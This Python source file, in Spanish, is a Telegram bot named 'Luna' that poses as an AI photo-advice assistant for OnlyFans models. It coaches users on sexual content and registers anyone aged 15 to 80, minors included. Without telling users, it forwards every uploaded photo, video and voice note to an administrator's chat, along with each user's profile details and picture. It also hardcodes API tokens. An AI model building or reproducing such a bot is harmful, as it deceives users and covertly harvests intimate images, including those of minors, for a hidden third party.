import os
import io
import random
import threading
import asyncio
import base64
import sqlite3
from datetime import datetime, timedelta
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from PIL import Image, ImageStat
from groq import Groq
from huggingface_hub import InferenceClient

# ==========================================
# 1. CONFIGURACIÓN GLOBAL
# ==========================================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 

client = Groq(api_key=GROQ_API_KEY)
hf_client = InferenceClient()
bot_pausado = False
modo_mantenimiento = False

# ==========================================
# 2. BASE DE DATOS SQLITE (Persistencia)
# ==========================================
def init_db():
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, 
                 nivel INTEGER, puntos INTEGER, estilo TEXT, fetiche TEXT, 
                 fecha_registro TEXT, ultima_actividad TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                 tipo TEXT, fecha TEXT, detalle TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad, nivel, puntos, estilo, fetiche):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, nombre, username, edad, nivel, puntos, estilo, fetiche, 
               datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def actualizar_usuario(user_id, campo, valor):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute(f"UPDATE usuarios SET {campo} = ? WHERE id = ?", (valor, user_id))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

# ==========================================
# 3. SERVIDOR WEB (Render Uptime)
# ==========================================
web_app = Flask(__name__)
@web_app.route('/')
def home(): return "Luna Bot v1000 en línea 24/7"
@web_app.route('/health')
def health(): return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# ==========================================
# 4. TEXTOS, RESPUESTAS Y CEREBRO LOCAL
# ==========================================
MENSAJES_PROCESANDO = [
    "🔍 **Encendiendo visión artificial híbrida...**\nAnalizando tu foto. Dame unos segundos.",
    "🧠 **Procesando imagen...**\nMi IA está revisando la luz, el encuadre y tu expresión. Un momento.",
    "✨ **Analizando composición...**\nBuscando la mejor manera de resaltar tu belleza. Espera.",
    "📸 **Revisando detalles...**\nDame un momento, estoy calculando la mejor iluminación para ti.",
    "🔥 **Despertando a la IA...**\nEstoy mirando tu foto a detalle. La espera valdrá la pena.",
    "🌙 **Conectando con los servidores...**\nDame un segundo, estoy viendo qué se puede mejorar."
]

CONSEJOS_LUZ = [
    "💡 La luz lateral es tu mejor amiga, marca los músculos y las curvas.",
    "💡 Si la luz es muy dura, pon una sábana blanca entre la lámpara y tú.",
    "💡 La luz de la ventana por la mañana es la más favorecedora.",
    "💡 Evita la luz directa del techo, aplana mucho el cuerpo.",
    "💡 Usa luces de colores (rojo o morado) para un ambiente más íntimo.",
    "💡 Si vas a usar flash, rebótalo en el techo, no de frente.",
    "💡 Las sombras duras pueden ser muy sensuales si se usan bien."
]

CONSEJOS_POSE = [
    "💃 Arquear un poco la espalda resalta tus curvas.",
    "💃 Relaja los hombros y baja la barbilla, da un aire de misterio.",
    "💃 Separa los brazos de la cintura para estilizar tu silueta.",
    "💃 Usa tus manos para jugar con tu cabello, da movimiento.",
    "💃 Si estás en la cama, deshaz las sábanas, se ve más natural.",
    "💃 Cruza un poco las piernas, estiliza y da un toque elegante.",
    "💃 Mira por encima del hombro, es un ángulo muy sensual.",
    "💃 Apóyate en una pared, proyecta seguridad y poder.",
    "💃 Juega con la ropa interior, a medio quitar llama mucho la atención.",
    "💃 Prueba a estar de rodillas, cambia totalmente la perspectiva."
]

CONSEJOS_FETICHES = [
    "🔞 Prueba con un poco de lencería de encaje, el contraste con la piel es muy popular.",
    "🔞 El uso de aceites corporales le da un brillo a la piel que llama mucho la atención.",
    "🔞 Juega con el misterio, dejar poco a la imaginación es más exitoso.",
    "🔞 Usa un espejo para mostrar ángulos que la cámara directa no puede captar.",
    "🔞 Los tacones altos estilizan la figura y son un clásico.",
    "🔞 Para el contenido en pareja, la conexión visual es más importante que la acción."
]

IDEAS_CONTENIDO = [
    "📸 Graba un video corto quitándote una prenda lentamente.",
    "📸 Haz una sesión con lencería de encaje y luz cálida.",
    "📸 Usa un espejo para mostrar un ángulo diferente de tu cuerpo.",
    "📸 Prueba un baño de espuma con pétalos de rosa.",
    "📸 Haz una sesión temática (enfermera, policía, profesora).",
    "📸 Juega con sombras chinescas en la pared.",
    "📸 Graba un audio susurrando, es muy popular en OnlyFans.",
    "📸 Usa aceites corporales para dar brillo a la piel."
]

FRASES_MOTIVADORAS = [
    "¡Vas por buen camino! Sigue así.",
    "Cada foto que subes te acerca más al éxito.",
    "La constancia es la clave del triunfo.",
    "Tu contenido está mejorando muchísimo.",
    "No te rindas, vas a ser la número uno."
]

# ==========================================
# 5. IA HÍBRIDA (Hugging Face + Groq)
# ==========================================
def ver_foto_con_huggingface(imagen_bytes):
    try:
        respuesta = hf_client.image_to_text(image=imagen_bytes, model="Salesforce/blip-image-captioning-base")
        return respuesta['generated_text']
    except Exception as e:
        print(f"Error en Hugging Face: {e}")
        return "una persona en una foto"

def generar_consejo_con_groq(descripcion_hf):
    try:
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, experta fotógrafa de adultos. Da 2 consejos sutiles sobre pose, luz o composición basados en la descripción. Sé profesional."},
                {"role": "user", "content": f"La IA de visión detectó: '{descripcion_hf}'. Dame los consejos."}
            ],
            model="llama3-8b-8192",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return random.choice(CONSEJOS_LUZ) + "\n" + random.choice(CONSEJOS_POSE)

async def conversar_con_ia(texto_usuario):
    try:
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, asistente de imagen amigable y profesional. Ayudas a modelos de OnlyFans. Responde natural, breve y útil."},
                {"role": "user", "content": texto_usuario}
            ],
            model="llama3-8b-8192",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return "Lo siento, me distraje un momento. ¿Qué me decías?"

# ==========================================
# 6. FUNCIONES AUXILIARES Y AVISOS
# ==========================================
async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        username = f"@{user.username}" if user.username else "Oculto"
        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada"
        
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE INICIAL (Luna)**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {user.first_name}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error en reporte: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# ==========================================
# 7. COMANDOS DE INICIO Y REGISTRO
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. Vuelve más tarde. 🌙")
    user_id = update.effective_user.id
    
    if not obtener_usuario(user_id):
        mensaje = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen con visión artificial híbrida.\n\n"
            "**¿Qué puedo hacer por ti?**\n"
            "📸 Analizar tus fotos para darte consejos de luz y pose.\n"
            "💡 Conversar contigo y darte ideas.\n"
            "🏆 Hacerte subir de nivel.\n\n"
            "Para empezar, envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje)
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o escríbeme.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    
    if obtener_usuario(user.id):
        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_ia(text)
        await update.message.reply_text(respuesta)
        return

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"
            
            fetiche = random.choice(CONSEJOS_FETICHES)
            guardar_usuario(user.id, user.first_name, user.username, edad, 1, 0, estilo, fetiche)
            
            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o escribirme.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango: 15 a 80.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

# ==========================================
# 8. COMANDOS DE LAS CHICAS
# ==========================================
async def pedir_idea(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"💡 **Idea de Luna:**\n{random.choice(IDEAS_CONTENIDO)}")

async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = obtener_usuario(user_id)
    if not user_data: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    nivel = user_data[4]
    pts = user_data[5]
    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "Desconocido")
    await update.message.reply_text(f"👤 **Tu Perfil**\n\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}\n🧠 Estilo: {user_data[6]}")

async def pedir_consejo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"💡 **Consejo de Luna:**\n{random.choice(CONSEJOS_LUZ)}\n\n{random.choice(CONSEJOS_POSE)}")

# ==========================================
# 9. COMANDOS DE ADMINISTRADOR (DANI)
# ==========================================
async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM usuarios")
    total = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {total}\n⚙️ Estado: {'Pausado' if bot_pausado else 'Activo'}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

async def admin_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT id, nombre, nivel FROM usuarios")
    rows = c.fetchall()
    conn.close()
    
    if not rows: return await update.message.reply_text("No hay chicas registradas.")
    texto = "👥 **Lista de Chicas:**\n"
    for row in rows:
        texto += f"- ID: {row[0]} | Nombre: {row[1]} | Nivel: {row[2]}\n"
    await update.message.reply_text(texto)

# ==========================================
# 10. RECEPCIÓN DE FOTOS Y MULTIMEDIA
# ==========================================
async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text(random.choice(MENSAJES_PROCESANDO))
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    # IA Híbrida
    descripcion = ver_foto_con_huggingface(photo_bytes)
    consejo = generar_consejo_con_groq(descripcion)
    
    respuesta_final = f"📸 **Lo que veo:** {descripcion.capitalize()}\n\n💡 **Mis consejos:**\n{consejo}"
    await msg_espera.edit_text(respuesta_final)
    
    # Actualizar Puntos
    user_data = obtener_usuario(user_id)
    puntos_actuales = user_data[5] + 10
    nivel_actual = user_data[4]
    
    if puntos_actuales >= 50 and nivel_actual == 1:
        nivel_actual = 2
        await update.message.reply_text("🎉 ¡Felicidades! Has subido a nivel Intermedia 🌿.")
    elif puntos_actuales >= 150 and nivel_actual == 2:
        nivel_actual = 3
        await update.message.reply_text("🏆 ¡Increíble! Has subido a nivel Avanzada 🌳.")
        
    actualizar_usuario(user_id, 'puntos', puntos_actuales)
    actualizar_usuario(user_id, 'nivel', nivel_actual)
    actualizar_usuario(user_id, 'ultima_actividad', datetime.now().isoformat())
    
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Foto")

async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🎥 **Procesando archivo...**\nDame un momento.")
    
    tipo, envio = "Archivo", "document"
    if update.message.video: tipo, envio = "Video", "video"; f = await update.message.video.get_file()
    elif update.message.voice: tipo, envio = "Nota de voz", "voice"; f = await update.message.voice.get_file()
    elif update.message.animation: tipo, envio = "GIF", "document"; f = await update.message.animation.get_file()
    else: return await update.message.reply_text("Formato no soportado.")
    
    await asyncio.sleep(2)
    await msg_espera.edit_text(f"✅ He recibido tu {tipo}. ¡Buen trabajo! {random.choice(FRASES_MOTIVADORAS)}")
    
    try:
        if envio == "video": await context.bot.send_video(chat_id=DANI_CHAT_ID, video=f.file_id)
        elif envio == "voice": await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=f.file_id)
        else: await context.bot.send_document(chat_id=DANI_CHAT_ID, document=f.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, tipo)

# ==========================================
# 11. MAIN
# ==========================================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", ver_perfil))
    app.add_handler(CommandHandler("idea", pedir_idea))
    app.add_handler(CommandHandler("consejo", pedir_consejo))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("pausar", admin_pausar))
    app.add_handler(CommandHandler("lista", admin_lista))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
    
    print("Luna Nivel 1000 en línea. Dani observa todo.")
    app.run_polling()

if __name__ == "__main__":
    main()
